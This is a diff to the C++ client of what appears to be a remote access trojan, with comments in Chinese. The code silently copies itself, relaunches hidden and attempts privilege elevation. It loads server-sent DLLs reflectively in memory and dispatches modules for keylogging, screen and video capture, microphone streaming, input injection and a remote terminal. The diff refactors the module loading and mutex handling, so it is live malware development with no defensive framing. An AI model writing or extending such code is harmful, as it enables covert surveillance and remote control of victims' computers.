@@ -128,8 +128,11 @@ void InstallClient() {
         if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
             if (CopyFileW(szCurrentPath, destPath.c_str(), FALSE)) {
                 // 如果是新安装，启动新进程并退出旧进程
-                ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
-                exit(0);
+                // 只有在非提权模式下才启动新进程，避免重复启动
+                if (g_ServerConfig.runasAdmin != 1 || IsAdmin()) {
+                    ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
+                    exit(0);
+                }
             }
         }
     }
@@ -271,8 +274,13 @@ uint32_t GetModuleKey(uint32_t cmd) {
 }
 void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
     bool hasDll = totalDataLen > (int)sizeof(CommandPkg);
+    uint32_t effectiveCmd = pkg->cmd;
+    if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
+        effectiveCmd = pkg->arg2;
+    }
+
     // 1. 终端模块缓存处理
-    if (pkg->cmd == CMD_TERMINAL_OPEN) {
+    if (effectiveCmd == CMD_TERMINAL_OPEN) {
         if (g_hTerminalModule) {
             if (g_pTerminalEntry) {
                  CommandPkg closePkg = { CMD_TERMINAL_CLOSE, 0, 0 };
@@ -285,15 +293,12 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
     }
     
     // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog, Mouse, Key)
-    // 注意：CMD_LOAD_MODULE也需要检查是否为多媒体模块（通过判断是否有DLL数据）
-    bool isMultimedia = (pkg->cmd == CMD_SCREEN_CAPTURE || pkg->cmd == CMD_VIDEO_STREAM || 
-                         pkg->cmd == CMD_VOICE_STREAM || pkg->cmd == CMD_KEYLOG ||
-                         pkg->cmd == CMD_MOUSE_EVENT || pkg->cmd == CMD_KEY_EVENT ||
-                         pkg->cmd == CMD_SCREEN_FPS || pkg->cmd == CMD_SCREEN_QUALITY ||
-                         (pkg->cmd == CMD_LOAD_MODULE && hasDll && pkg->arg2 == 0));
+    bool isMultimedia = (effectiveCmd == CMD_SCREEN_CAPTURE || effectiveCmd == CMD_VIDEO_STREAM || 
+                         effectiveCmd == CMD_VOICE_STREAM || effectiveCmd == CMD_KEYLOG ||
+                         effectiveCmd == CMD_MOUSE_EVENT || effectiveCmd == CMD_KEY_EVENT ||
+                         effectiveCmd == CMD_SCREEN_FPS || effectiveCmd == CMD_SCREEN_QUALITY);
 
     if (isMultimedia && g_hMultimediaModule) {
-        // 如果多媒体模块已加载，直接调用入口
         if (g_pMultimediaEntry) {
             if (hasDll) {
                 pkg->arg1 = pkg->arg2;
@@ -303,73 +308,50 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         return;
     }
 
-    if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
-        uint32_t moduleKey = pkg->arg2;
-        uint32_t dllSize = pkg->arg1;
-        if (dllSize == 0) return;
-        char* dllData = pkg->data;
-        HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
-        if (hMod) {
-            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
-            if (pEntry) {
-                auto it = g_ModuleCache.find(moduleKey);
-                if (it != g_ModuleCache.end()) {
-                    MemoryFreeLibrary(it->second);
-                }
-                g_ModuleCache[moduleKey] = hMod;
-                g_ModuleEntryCache[moduleKey] = pEntry;
-
-                // 立即执行一次命令
-                CommandPkg runPkg = *pkg;
-                runPkg.cmd = moduleKey;
-                runPkg.arg1 = 0;
-                runPkg.arg2 = 0;
-                pEntry(s, &runPkg);
-
-                return;
-            }
-            MemoryFreeLibrary(hMod);
-        }
-        return;
-    }
-
     uint32_t dllSize = pkg->arg1;
     char* dllData = pkg->data;
     
     if (dllSize == 0) return;
 
-    // 使用 MemoryModule 直接在内存中加载 DLL，无需释放文件
     HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
     if (hMod) {
         PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
         if (pEntry) {
-            if (isMultimedia && hasDll) {
-                pkg->arg1 = pkg->arg2;
-            }
-            pEntry(s, pkg);
-            
             // 如果是终端模块，需要常驻内存
-            if (pkg->cmd == CMD_TERMINAL_OPEN) {
+            if (effectiveCmd == CMD_TERMINAL_OPEN) {
                 g_hTerminalModule = hMod;
                 g_pTerminalEntry = pEntry;
+                pEntry(s, pkg); // 这里的 pkg->cmd 可能是 CMD_LOAD_MODULE，但模块内部应该处理或者我们改一下
                 return; 
             }
-            // 如果是多媒体模块，也需要常驻内存 (因为有线程)
+            // 如果是多媒体模块，也需要常驻内存
             if (isMultimedia) {
                 g_hMultimediaModule = hMod;
                 g_pMultimediaEntry = pEntry;
+                if (hasDll) pkg->arg1 = pkg->arg2;
+                pEntry(s, pkg);
                 return;
             }
-            uint32_t moduleKey = GetModuleKey(pkg->cmd);
-            if (moduleKey != 0) {
-                auto it = g_ModuleCache.find(moduleKey);
-                if (it != g_ModuleCache.end()) {
-                    MemoryFreeLibrary(it->second);
-                }
-                g_ModuleCache[moduleKey] = hMod;
-                g_ModuleEntryCache[moduleKey] = pEntry;
-                return;
+
+            uint32_t moduleKey = GetModuleKey(effectiveCmd);
+            if (moduleKey == 0) moduleKey = effectiveCmd; // 如果 GetModuleKey 没定义，就用当前的
+
+            auto it = g_ModuleCache.find(moduleKey);
+            if (it != g_ModuleCache.end()) {
+                MemoryFreeLibrary(it->second);
             }
+            g_ModuleCache[moduleKey] = hMod;
+            g_ModuleEntryCache[moduleKey] = pEntry;
+
+            // 执行初始命令
+            CommandPkg runPkg = *pkg;
+            runPkg.cmd = moduleKey;
+            // 保持原有的 arg1, arg2 可能不合适，因为 arg1 是 dllSize
+            // 但有些模块可能需要原有的参数，不过通常 CMD_LOAD_MODULE 时不需要
+            runPkg.arg1 = 0; 
+            runPkg.arg2 = 0;
+            pEntry(s, &runPkg);
+            return;
         }
         MemoryFreeLibrary(hMod);
     }
@@ -639,12 +621,14 @@ void ClientMain() {
     
     // 互斥体防止重复运行 (处理随机上线逻辑)
     if (g_ServerConfig.iMultiOpen == 0) {
-        std::string mutName = "Global\\FRMD26_" + std::string(g_ServerConfig.szServerIP);
+        // 使用会话级别互斥体，避免跨会话问题
+        std::string mutName = "FRMD26_" + std::string(g_ServerConfig.szServerIP);
         HANDLE hMutex = CreateMutexA(NULL, TRUE, mutName.c_str());
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
             if (hMutex) CloseHandle(hMutex);
             return;
         }
+        // 不关闭互斥体句柄，保持进程生命周期
     }
 
     // 尝试提权运行
